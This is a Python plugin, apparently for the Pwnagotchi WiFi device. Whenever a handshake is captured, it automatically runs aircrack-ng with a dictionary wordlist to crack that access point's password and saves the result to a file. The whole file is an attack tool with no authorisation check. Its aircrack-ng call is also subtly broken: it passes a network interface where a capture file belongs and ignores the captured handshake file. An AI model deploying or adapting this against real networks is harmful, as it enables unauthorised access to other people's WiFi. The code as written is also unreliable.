#https://github.com/Deus73/pwnagotchi-plugins/blob/main/wifi_password_cracker.py
import subprocess
import pwnagotchi.plugins as plugins

class WiFiPasswordCracker(plugins.Plugin):
    __author__ = 'Deus Dust (edited by avipars)'
    __version__ = '1.0.1'
    __license__ = 'MIT'

    def __init__(self):
        super(WiFiPasswordCracker, self).__init__()

    def crack_wifi_password(self, target_bssid, wordlist_path="/path/to/wordlist.txt", interface="wlan0"):
        try:
            subprocess.run(["aircrack-ng", "-b", target_bssid, "-w", wordlist_path, "-l", "cracked.txt", interface], check=True)
            self.log.info(f"WiFi password cracked for {target_bssid}")
        except subprocess.CalledProcessError as e:
            self.log.error(f"Failed to crack WiFi password: {e}")

    def on_loaded(self):
        self.log.info("WiFi Password Cracker Plugin loaded")

    def on_handshake(self, agent, filename, access_point):
        target_bssid = access_point.bssid
        self.crack_wifi_password(target_bssid, wordlist_path="/home/pi/wordlists/dict.txt")

    def on_unload(self):
        self.log.info("WiFi Password Cracker Plugin unloaded")

# Instantiate the plugin
plugin = WiFiPasswordCracker()